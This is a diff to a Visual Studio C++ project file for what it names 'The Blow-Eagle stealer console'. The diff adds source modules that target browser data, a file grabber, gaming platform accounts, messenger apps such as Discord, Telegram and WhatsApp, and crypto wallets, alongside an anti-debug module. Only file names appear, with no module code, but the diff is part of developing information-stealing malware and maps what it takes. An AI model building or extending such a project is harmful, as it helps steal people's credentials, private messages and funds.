@@ -142,9 +142,23 @@
   <ItemGroup>
     <ClCompile Include="scripts\manager\dirs.cpp" />
     <ClCompile Include="scripts\secure\anti-debug.cpp" />
+    <ClCompile Include="targets\browsers\browsers.cpp" />
+    <ClCompile Include="targets\files\file-grabber.cpp" />
+    <ClCompile Include="targets\files\txt.cpp" />
+    <ClCompile Include="targets\gaming\battleNET.cpp" />
+    <ClCompile Include="targets\gaming\epicGames.cpp" />
+    <ClCompile Include="targets\gaming\minecraft.cpp" />
+    <ClCompile Include="targets\gaming\steam.cpp" />
+    <ClCompile Include="targets\gaming\uplay.cpp" />
+    <ClCompile Include="targets\messengers\discord.cpp" />
+    <ClCompile Include="targets\messengers\skype.cpp" />
+    <ClCompile Include="targets\messengers\telegram.cpp" />
+    <ClCompile Include="targets\messengers\viber.cpp" />
+    <ClCompile Include="targets\messengers\whatsapp.cpp" />
     <ClCompile Include="targets\system\processes.cpp" />
     <ClCompile Include="targets\system\progs.cpp" />
     <ClCompile Include="targets\system\systeminfo.cpp" />
+    <ClCompile Include="targets\wallets\wallets.cpp" />
     <ClCompile Include="The Blow-Eagle stealer console.cpp" />
   </ItemGroup>
   <ItemGroup>
